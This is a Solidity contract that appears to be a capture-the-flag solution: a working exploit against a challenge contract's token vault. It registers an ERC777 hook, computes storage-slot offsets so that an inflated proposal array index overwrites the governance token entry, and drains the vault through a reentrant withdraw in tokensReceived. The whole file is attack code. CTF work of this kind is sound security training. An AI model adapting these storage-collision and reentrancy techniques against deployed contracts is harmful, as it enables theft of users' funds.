// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/introspection/IERC1820Registry.sol";
import "@openzeppelin/contracts/token/ERC777/IERC777Recipient.sol";

interface IChallenge_lucyoa {
    function govTokens(uint256) external view returns (address);

    function tokens(uint256) external view returns (address);

    function deposit(uint256, uint256) external;

    function balances(address, address) external view returns (uint256);

    function faucetUsed() external view returns (bool);

    function addProposal(uint256) external;

    function withdraw(uint256) external;

    function faucet() external;
}

contract Exploit_lucyoa is IERC777Recipient {
    IChallenge_lucyoa instance;
    IERC20 gov;
    IERC1820Registry internal constant _ERC1820_REGISTRY = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
    bytes32 private constant _TOKENS_RECIPIENT_INTERFACE_HASH = keccak256("ERC777TokensRecipient");
    uint256 loc;

    constructor(IChallenge_lucyoa _instance) payable {
        instance = _instance;
        _ERC1820_REGISTRY.setInterfaceImplementer(address(0), _TOKENS_RECIPIENT_INTERFACE_HASH, address(this));
        gov = IERC20(instance.govTokens(0));
    }

    function finalize() external {
        instance.faucet();

        gov.approve(address(instance), type(uint256).max);

        uint256 govSlot = 3;
        uint256 tokensSlot = 0;
        uint256 balancesSlot = 5;
        uint256 govLocation = uint256(keccak256(abi.encodePacked(govSlot)));
        uint256 tokensLocation = uint256(keccak256(abi.encodePacked(tokensSlot)));

        address t = address(this);
        bytes32 govTokenBalanceSlot = keccak256(abi.encode(address(gov), balancesSlot));
        uint256 myBalanceSlot = uint256(keccak256(abi.encode(t, govTokenBalanceSlot)));

        instance.addProposal(type(uint256).max);

        instance.deposit(govLocation - tokensLocation, gov.balanceOf(address(this)));

        loc = govLocation - tokensLocation;
        instance.withdraw(loc);
    }

    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external override(IERC777Recipient) {
        if (gov.balanceOf(address(instance)) > 0) {
            instance.withdraw(loc);
        }
    }
}
